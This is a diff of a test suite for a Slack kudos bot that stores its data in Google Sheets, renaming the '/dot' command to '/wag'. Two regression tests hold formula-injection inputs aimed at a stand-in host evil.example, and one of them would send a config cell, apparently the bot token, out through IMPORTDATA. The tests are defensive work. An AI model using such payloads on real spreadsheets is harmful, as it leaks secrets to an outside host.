   eq(env.call('cfgStr', 'SLACK_BOT_TOKEN'), 'xoxb-test', 'the token must be unchanged');
 });
 
 test('destructive commands require confirmation', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
-  const warn = body(slashCommand(env, '/dot-admin', 'reset'));
-  includes(warn.text, 'Run `/dot-admin reset confirm`');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
+  const warn = body(slashCommand(env, '/wag-admin', 'reset'));
+  includes(warn.text, 'Run `/wag-admin reset confirm`');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 4, 'nothing should have changed');
 
-  slashCommand(env, '/dot-admin', 'reset confirm');
+  slashCommand(env, '/wag-admin', 'reset confirm');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 5);
 });
 
 test('pause and resume work from Slack', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
-  slashCommand(env, '/dot-admin', 'pause');
-  includes(body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice')).text, 'paused');
-  slashCommand(env, '/dot-admin', 'resume');
-  eq(body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice')).response_type, 'in_channel');
+  slashCommand(env, '/wag-admin', 'pause');
+  includes(body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice')).text, 'paused');
+  slashCommand(env, '/wag-admin', 'resume');
+  eq(body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice')).response_type, 'in_channel');
 });
 
 test('rebuild recomputes balances from the ledger', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> x2 two good things this week');
-  slashCommand(env, '/dot', '<@U08DANA1> another good thing this week');
+  slashCommand(env, '/wag', '<@U08SAM01> x2 two good things this week');
+  slashCommand(env, '/wag', '<@U08DANA1> another good thing this week');
 
   // Corrupt a balance by hand, the way a stray sheet edit would.
   const bal = env.call('getBalance_', 'U08SAM01', 'sam');
@@ -964,7 +964,7 @@ test('rebuild recomputes balances from the ledger', () => {
   env.call('writeBalance_', bal);
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 999);
 
-  slashCommand(env, '/dot-admin', 'rebuild confirm');
+  slashCommand(env, '/wag-admin', 'rebuild confirm');
   env.run('cacheDropAll_();');
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 2,
     'the ledger is the source of truth');
@@ -973,8 +973,8 @@ test('rebuild recomputes balances from the ledger', () => {
 
 test('rebuild does not credit admin grants against the granting admin\'s allowance', () => {
   const env = freshEnv({ ADMIN_USER_IDS: 'U08JOSH1' });
-  slashCommand(env, '/dot-admin', 'grant <@U08SAM01> 3 for the conference talk');
-  slashCommand(env, '/dot-admin', 'rebuild confirm');
+  slashCommand(env, '/wag-admin', 'grant <@U08SAM01> 3 for the conference talk');
+  slashCommand(env, '/wag-admin', 'rebuild confirm');
   env.run('cacheDropAll_();');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').given_total), 0,
     'an admin grant is not the admin being generous with their own allowance');
@@ -987,7 +987,7 @@ suite('Notifications');
 
 test('the recipient gets a DM', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   const dms = env.fetchesTo('chat.postMessage').filter((f) => f.payload.channel === 'U08SAM01');
   eq(dms.length, 1);
   includes(JSON.stringify(dms[0].payload), 'covered two sessions at no notice');
@@ -995,21 +995,21 @@ test('the recipient gets a DM', () => {
 
 test('DMs can be switched off', () => {
   const env = freshEnv({ DM_RECIPIENT: false });
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   eq(env.fetchesTo('chat.postMessage').filter((f) => f.payload.channel === 'U08SAM01').length, 0);
 });
 
 test('DMs to several recipients go out in one parallel batch', () => {
   const env = freshEnv();
   env.clearFetches();
-  slashCommand(env, '/dot', '<@U08SAM01> <@U08DANA1> <@U08LEE01> you three covered the whole week');
+  slashCommand(env, '/wag', '<@U08SAM01> <@U08DANA1> <@U08LEE01> you three covered the whole week');
   const dms = env.fetchesTo('chat.postMessage').filter((f) => /^U0/.test(f.payload.channel));
   eq(dms.length, 3);
 });
 
 test('centralized announcing posts to the announcement channel instead of the source channel', () => {
   const env = freshEnv({ ANNOUNCE_IN_SOURCE_CHANNEL: false });
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice'));
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
   eq(b.response_type, 'ephemeral', 'the public post goes to the announcement channel, not inline');
   const posts = env.fetchesTo('chat.postMessage').filter((f) => f.payload.channel === 'C_KUDOS');
   eq(posts.length, 1);
@@ -1017,7 +1017,7 @@ test('centralized announcing posts to the announcement channel instead of the so
 
 test('the App Home renders without throwing and includes the balance', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   const view = env.call('buildHomeView_', 'U08JOSH1');
   eq(view.type, 'home');
   assert(view.blocks.length > 5, 'the home tab should have real content');
@@ -1027,7 +1027,7 @@ test('the App Home renders without throwing and includes the balance', () => {
 test('the App Home stays within Slack\'s 100-block limit', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0, ALLOWANCE_PEER: 60 });
   for (let i = 0; i < 40; i++) {
-    slashCommand(env, '/dot', `<@U08SAM01> good thing number ${i} happened today`);
+    slashCommand(env, '/wag', `<@U08SAM01> good thing number ${i} happened today`);
   }
   const view = env.call('buildHomeView_', 'U08JOSH1');
   assert(view.blocks.length <= 100, `home view had ${view.blocks.length} blocks`);
@@ -1039,8 +1039,8 @@ suite('Digest');
 
 test('the digest reports last week\'s totals and value breakdown', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> #real-world made the plan work at daycare');
-  slashCommand(env, '/dot', '<@U08DANA1> #collaborate worked well with the school');
+  slashCommand(env, '/wag', '<@U08SAM01> #real-world made the plan work at daycare');
+  slashCommand(env, '/wag', '<@U08DANA1> #collaborate worked well with the school');
 
   env.setNow(new Date('2026-09-21T15:00:00Z')); // the following Monday
   env.run('cacheDropAll_();');
@@ -1050,7 +1050,7 @@ test('the digest reports last week\'s totals and value breakdown', () => {
 
   const post = env.fetchesTo('chat.postMessage')[0];
   const text = JSON.stringify(post.payload);
-  includes(text, 'Most dots received');
+  includes(text, 'Most wags received');
   includes(text, 'Make It Work in the Real World');
 });
 
@@ -1106,10 +1106,10 @@ test('config booleans accept the things humans type into a spreadsheet', () => {
   });
 });
 
-test('a Slack API failure does not lose the dot', () => {
+test('a Slack API failure does not lose the wag', () => {
   const env = freshEnv();
   env.state.fetchResponses['chat.postMessage'] = { ok: false, error: 'channel_not_found' };
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice'));
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
   eq(b.response_type, 'in_channel', 'the announcement is the HTTP response, so it still reaches the channel');
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1,
     'the ledger write must not depend on a DM succeeding');
@@ -1118,7 +1118,7 @@ test('a Slack API failure does not lose the dot', () => {
 test('a lock conflict is reported as retryable, not as a crash', () => {
   const env = freshEnv();
   env.state.lockHeld = true;
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice'));
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
   includes(b.text, 'Try again');
   eq(env.sheetRows('Ledger').length, 0);
 });
@@ -1132,24 +1132,24 @@ test('an unparseable request is answered politely rather than with a stack trace
 test('a missing bot token does not take down the give path', () => {
   const env = freshEnv();
   env.setConfigValue('SLACK_BOT_TOKEN', '');
-  const b = body(slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice'));
+  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
   eq(b.response_type, 'in_channel');
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1);
 });
 
 test('balances survive a cache wipe mid-flight', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> first good thing this week');
+  slashCommand(env, '/wag', '<@U08SAM01> first good thing this week');
   env.run('cacheDropAll_(); __configCache = null;');
-  slashCommand(env, '/dot', '<@U08SAM01> second good thing this week');
+  slashCommand(env, '/wag', '<@U08SAM01> second good thing this week');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 3,
     'the sheet, not the cache, is authoritative');
 });
 
 test('two people giving to the same person both land', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
-  slashCommand(env, '/dot', '<@U08SAM01> also helped me with the report', { user_id: 'U08DANA1', user_name: 'dana' });
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> also helped me with the report', { user_id: 'U08DANA1', user_name: 'dana' });
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 2);
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 4);
   eq(env.call('num_', env.call('getBalance_', 'U08DANA1', 'dana').remaining), 4);
@@ -1167,12 +1167,12 @@ test('the demo seeder and its cleanup leave no trace', () => {
 
 test('the leaderboard web page renders with real data', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   const out = env.call('doGet', { parameter: { k: 'secret123', period: 'period' } });
   assert(out, 'doGet returned nothing');
   const data = out._data;
   eq(data.rows[0].user_id, 'U08SAM01');
-  eq(data.stats.dotsAllTime, 1);
+  eq(data.stats.wagsAllTime, 1);
 });
 
 test('the leaderboard page refuses a wrong key', () => {
@@ -1205,8 +1205,8 @@ suite('Regressions — found in adversarial review');
 
 test('REG-1 a self-give does not discard what the receiver earned', () => {
   const env = freshEnv({ ALLOW_SELF_KUDOS: true, MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  env.call('giveDots_', {
-    giverId: 'U08JOSH1', giverName: 'josh', userIds: ['U08JOSH1'], dotsEach: 1,
+  env.call('giveWags_', {
+    giverId: 'U08JOSH1', giverName: 'josh', userIds: ['U08JOSH1'], wagsEach: 1,
     reason: 'giving myself one, because the config allows it',
     channelId: 'C_GENERAL', channelName: 'general', source: 'slash', messageTs: ''
   });
@@ -1220,12 +1220,12 @@ test('REG-1 a self-give does not discard what the receiver earned', () => {
 test('REG-1b a self-give does not award the same badge twice', () => {
   const env = freshEnv({
     ALLOW_SELF_KUDOS: true, MAX_PER_RECIPIENT_PER_PERIOD: 0,
-    BADGE_THRESHOLDS: '3', BADGE_LABELS: 'Pilot Light', BADGE_EMOJI: ':large_orange_circle:',
+    BADGE_THRESHOLDS: '3', BADGE_LABELS: 'Pilot Light', BADGE_EMOJI: ':jackson:',
     GIVER_BADGE_THRESHOLDS: '999'
   });
   for (let i = 0; i < 5; i++) {
-    env.call('giveDots_', {
-      giverId: 'U08JOSH1', giverName: 'josh', userIds: ['U08JOSH1'], dotsEach: 1,
+    env.call('giveWags_', {
+      giverId: 'U08JOSH1', giverName: 'josh', userIds: ['U08JOSH1'], wagsEach: 1,
       reason: 'another one for me, number ' + i, channelId: 'C_GENERAL', source: 'slash'
     });
   }
@@ -1235,7 +1235,7 @@ test('REG-1b a self-give does not award the same badge twice', () => {
 
 test('REG-2 a reason starting with = cannot become a live spreadsheet formula', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot',
+  slashCommand(env, '/wag',
     '<@U08SAM01> =IMPORTDATA("https://evil.example/?t="&Config!B2) is a perfectly normal reason');
   eq(env.formulaCells('Ledger').length, 0,
     'a leading = must be neutralized before it reaches the sheet');
@@ -1246,7 +1246,7 @@ test('REG-2 a reason starting with = cannot become a live spreadsheet formula', 
 test('REG-2b a display name starting with = is neutralized too', () => {
   const env = freshEnv();
   env.addUser('U08EVIL1', '=HYPERLINK("https://evil.example","hi")');
-  slashCommand(env, '/dot', '<@U08EVIL1> welcome to the team, glad you are here');
+  slashCommand(env, '/wag', '<@U08EVIL1> welcome to the team, glad you are here');
   eq(env.formulaCells('Ledger').length, 0);
   eq(env.formulaCells('Balances').length, 0);
   eq(env.formulaCells('Roster').length, 0);
@@ -1256,7 +1256,7 @@ test('REG-3 writeBalance_ refuses to overwrite a row that moved under it', () =>
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
   // Four people, so there are rows to shift.
   ['U08JOSH1', 'U08SAM01', 'U08DANA1', 'U08LEE01'].forEach((id) => env.call('getBalance_', id, id));
-  slashCommand(env, '/dot', '<@U08LEE01> a dot so lee has something to lose');
+  slashCommand(env, '/wag', '<@U08LEE01> a wag so lee has something to lose');
   const leeBefore = env.call('num_', env.call('getBalance_', 'U08LEE01', 'lee').received_total);
 
   // Hold a balance object, then delete a row above it the way an admin would.
@@ -1275,7 +1275,7 @@ test('REG-3 writeBalance_ refuses to overwrite a row that moved under it', () =>
 
 test('REG-4 an upgraded sheet with a reordered column does not scramble balances', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   const before = env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total);
 
   // Simulate an upgrade: setup appends any missing column on the right, so the
@@ -1289,7 +1289,7 @@ test('REG-4 an upgraded sheet with a reordered column does not scramble balances
 
 test('REG-5 a month key survives Sheets coercing it to a Date', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> x3 three dots in the current month');
+  slashCommand(env, '/wag', '<@U08SAM01> x3 three wags in the current month');
 
   // Confirm the harness is genuinely exercising the coercion path.
   const raw = env.rawCell('Balances', 2, 1);
@@ -1306,19 +1306,19 @@ test('REG-5 a month key survives Sheets coercing it to a Date', () => {
 
 test('REG-5b the raffle accumulates into one row per person per month', () => {
   const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> first dot of the month');
-  slashCommand(env, '/dot', '<@U08SAM01> second dot of the month');
-  slashCommand(env, '/dot', '<@U08SAM01> third dot of the month');
+  slashCommand(env, '/wag', '<@U08SAM01> first wag of the month');
+  slashCommand(env, '/wag', '<@U08SAM01> second wag of the month');
+  slashCommand(env, '/wag', '<@U08SAM01> third wag of the month');
   const rows = env.sheetRows('Raffle').filter((r) => String(r.user_id) === 'U08SAM01');
   eq(rows.length, 1, 'a failed period match would append a new row per give');
   eq(env.call('num_', rows[0].entries), 3);
 });
 
-test('REG-5c daily mode does not hand out unlimited dots', () => {
+test('REG-5c daily mode does not hand out unlimited wags', () => {
   const env = freshEnv({ ALLOWANCE_PERIOD: 'day', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  for (let i = 0; i < 5; i++) slashCommand(env, '/dot', `<@U08SAM01> good thing number ${i} today`);
-  const sixth = body(slashCommand(env, '/dot', '<@U08SAM01> a sixth thing on the same day'));
-  includes(sixth.text, 'out of dots',
+  for (let i = 0; i < 5; i++) slashCommand(env, '/wag', `<@U08SAM01> good thing number ${i} today`);
+  const sixth = body(slashCommand(env, '/wag', '<@U08SAM01> a sixth thing on the same day'));
+  includes(sixth.text, 'out of wags',
     'a coerced period_key would refill the allowance on every single read');
   eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 5);
 });
@@ -1329,7 +1329,7 @@ test('REG-6 a lock conflict on the emoji path releases the claim and tells the g
     type: 'event_callback', team_id: 'T_TEST',
     event: {
       type: 'message', user: 'U08JOSH1', channel: 'C_GENERAL', ts: '1758000900.000100',
-      text: '<@U08SAM01> :large_orange_circle: saved me two hours on the auth today'
+      text: '<@U08SAM01> :jackson: saved me two hours on the auth today'
     }
   };
 
@@ -1337,7 +1337,7 @@ test('REG-6 a lock conflict on the emoji path releases the claim and tells the g
   env.call('handleEvent_', event);
   eq(env.sheetRows('Ledger').length, 0);
   const warned = env.fetchesTo('chat.postEphemeral');
-  assert(warned.length >= 1, 'the giver must be told the dot did not land');
+  assert(warned.length >= 1, 'the giver must be told the wag did not land');
 
   // Slack's retry of the same event must now succeed.
   env.state.lockHeld = false;
@@ -1347,7 +1347,7 @@ test('REG-6 a lock conflict on the emoji path releases the claim and tells the g
 
 test('REG-7 the digest reports one week, not the whole ledger, in daily mode', () => {
   const env = freshEnv({ ALLOWANCE_PERIOD: 'day', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
-  slashCommand(env, '/dot', '<@U08SAM01> a dot in the current week');
+  slashCommand(env, '/wag', '<@U08SAM01> a wag in the current week');
 
   // A stale row from long ago must not be counted as "last week".
   env.call('appendLedger_', {
@@ -1362,7 +1362,7 @@ test('REG-7 the digest reports one week, not the whole ledger, in daily mode', (
   env.call('postDigest_', true);
 
   const post = env.fetchesTo('chat.postMessage')[0];
-  assert(String(JSON.stringify(post.payload)).indexOf('99 dots') === -1,
+  assert(String(JSON.stringify(post.payload)).indexOf('99 wags') === -1,
     'the digest must scope to one week, not return every row ever written');
 });
 
@@ -1377,7 +1377,7 @@ test('REG-8 an App Home button with no response_url still answers, via DM', () =
   });
   const dms = env.fetchesTo('chat.postMessage').filter((f) => f.payload.channel === 'U08JOSH1');
   eq(dms.length, 1, 'the button must not be a dead click');
-  includes(JSON.stringify(dms[0].payload), 'Giving a dot');
+  includes(JSON.stringify(dms[0].payload), 'Giving a wag');
 });
 
 test('REG-10 prevPeriodKey_ steps back a day even at UTC+13', () => {
@@ -1395,15 +1395,15 @@ test('REG-10 prevPeriodKey_ steps back a day even at UTC+13', () => {
 test('REG-10b a daily giving streak accumulates across consecutive days', () => {
   const env = freshEnv({ ALLOWANCE_PERIOD: 'day', TIMEZONE: 'Pacific/Auckland' });
   env.setNow(new Date('2026-09-16T04:00:00Z'));
-  slashCommand(env, '/dot', '<@U08SAM01> day one good thing happened');
+  slashCommand(env, '/wag', '<@U08SAM01> day one good thing happened');
   env.setNow(new Date('2026-09-17T04:00:00Z'));
-  slashCommand(env, '/dot', '<@U08SAM01> day two good thing happened');
+  slashCommand(env, '/wag', '<@U08SAM01> day two good thing happened');
   eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 2);
 });
 
 test('REG-11 an app_mention retry does not post the leaderboard twice', () => {
   const env = freshEnv();
-  slashCommand(env, '/dot', '<@U08SAM01> covered two sessions at no notice');
+  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
   env.clearFetches();
   const event = {
     type: 'event_callback', team_id: 'T_TEST',
@@ -1436,7 +1436,7 @@ test('REG-13 a reaction reason is not escaped twice', () => {
   env.call('handleEvent_', {
     type: 'event_callback', team_id: 'T_TEST',
     event: {
-      type: 'reaction_added', user: 'U08JOSH1', reaction: 'large_orange_circle',
+      type: 'reaction_added', user: 'U08JOSH1', reaction: 'jackson',
       item_user: 'U08SAM01', item: { type: 'message', channel: 'C_GENERAL', ts: '1758001100.000100' }
     }
   });
@@ -1453,7 +1453,7 @@ test('REG-9 a five-person give makes no sequential profile lookups', () => {
   Object.keys(env.state.cache).forEach((k) => { if (k.indexOf('user.') !== -1) delete env.state.cache[k]; });
   env.clearFetches();
 
-  slashCommand(env, '/dot',
+  slashCommand(env, '/wag',
     '<@U08SAM01> <@U08DANA1> <@U08LEE01> <@U08KIM01> you four carried the whole week');
 
   const singles = env.state.fetches.filter((f) => f.method === 'users.info' && !f.params.__batched);
